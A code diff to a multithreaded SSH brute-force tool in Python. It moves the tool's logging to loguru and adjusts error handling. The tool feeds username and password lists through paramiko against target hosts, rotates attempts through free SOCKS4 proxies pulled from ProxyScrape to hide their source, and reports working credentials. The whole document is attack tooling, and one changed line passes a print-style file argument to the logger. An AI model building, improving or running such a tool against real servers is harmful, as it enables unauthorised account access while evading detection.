@@ -19,6 +19,7 @@ import threading
 import time
 
 # third-party imports
+from loguru import logger
 import paramiko
 import requests
 import socks
@@ -80,24 +81,18 @@ class SshBruteForcer(threading.Thread):
                 socket.timeout,
                 socks.GeneralProxyError,
                 socks.ProxyConnectionError,
+                paramiko.SSHException,
             ):
-                logger.info(
-                    f"(queue size: {self.jobs.qsize()}) SOCKS error: {username}@{hostname}:{port}:{password}"
+                logger.debug(
+                    f"(queue size: {self.jobs.qsize()}) Connection error: {username}@{hostname}:{port}:{password}"
                 )
                 self.jobs.put((hostname, username, password, port, timeout))
 
             # authentication failure (wrong password)
             except paramiko.AuthenticationException:
                 logger.info(
-                    f"(queue size: {self.jobs.qsize()}) Invalid credentials: {username}@{hostname}:{port}:{password}"
+                    f"(queue size: {self.jobs.qsize()}) Invalid credential: {username}@{hostname}:{port}:{password}"
                 )
-
-            # other SSH errors
-            except (paramiko.SSHException):
-                logger.info(
-                    f"(queue size: {self.jobs.qsize()}) SSH Error: {username}@{hostname}:{port}:{password}"
-                )
-                # self.jobs.put((hostname, username, password, port, timeout))
 
             # other uncaught exceptions
             except Exception as e:
@@ -107,7 +102,7 @@ class SshBruteForcer(threading.Thread):
 
             # login successful
             else:
-                logger.warning(
+                logger.success(
                     f"(queue size: {self.jobs.qsize()}) Valid credentials found: {username}@{hostname}:{port}:{password}"
                 )
                 self.valid_credentials.append(
@@ -158,6 +153,7 @@ def parse_arguments():
 
 
 def get_proxies() -> collections.deque:
+    logger.info("Retrieving SOCKS4 proxies from ProxyScrape")
     proxies_request = requests.get(
         "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all"
     )
@@ -170,16 +166,13 @@ def get_proxies() -> collections.deque:
 
     # requests failed to download the list of proxies, raise an exception
     else:
-        logger.error("An error occured while retrieving a list of proxies")
+        logger.critical("An error occured while retrieving a list of proxies")
         proxies_request.raise_for_status()
 
 
 def main():
-    # configure logger
-    global logger
-    logging.basicConfig(format="%(levelname)s:%(message)s", level=logging.CRITICAL)
-    logger = logging.getLogger(f"{__package__}.__name__")
-    logger.setLevel(logging.DEBUG)
+    # disable built-in logging so paramiko won't print tracebacks
+    logging.basicConfig(level=logging.CRITICAL)
 
     # parse command line arguments
     args = parse_arguments()
@@ -202,6 +195,7 @@ def main():
         proxies = get_proxies()
 
     # create threads
+    logger.info(f"Launching {args.threads} brute-forcer threads")
     for thread_id in range(args.threads):
         thread = SshBruteForcer(jobs, valid_credentials, proxies)
         thread.name = str(thread_id)
@@ -209,6 +203,7 @@ def main():
         thread_pool.append(thread)
 
     # add username and password combinations to jobs queue
+    logger.info("Loading usernames and passwords into queue")
     with args.username.open("r") as username_file:
         with args.password.open("r") as password_file:
             for username in username_file:
@@ -227,7 +222,7 @@ def main():
         while not jobs.empty():
             for thread in thread_pool:
                 if not thread.is_alive():
-                    print(
+                    logger.error(
                         f"Thread {thread.name} exited early with errors",
                         file=sys.stderr,
                     )
@@ -239,7 +234,7 @@ def main():
                 break
 
     except (SystemExit, KeyboardInterrupt):
-        print("Stop signal received, stopping threads")
+        logger.warning("Stop signal received, stopping threads")
 
     finally:
         for thread in thread_pool:
@@ -248,7 +243,9 @@ def main():
         for thread in thread_pool:
             thread.join()
 
-    print(f"Brute-force completed, {len(valid_credentials)} valid credentials found")
+    logger.success(
+        f"Brute-force completed, {len(valid_credentials)} valid credentials found"
+    )
     for hostname, username, password, port, timeout in valid_credentials:
         print(f"{username}@{hostname}:{port}:{password}")
 
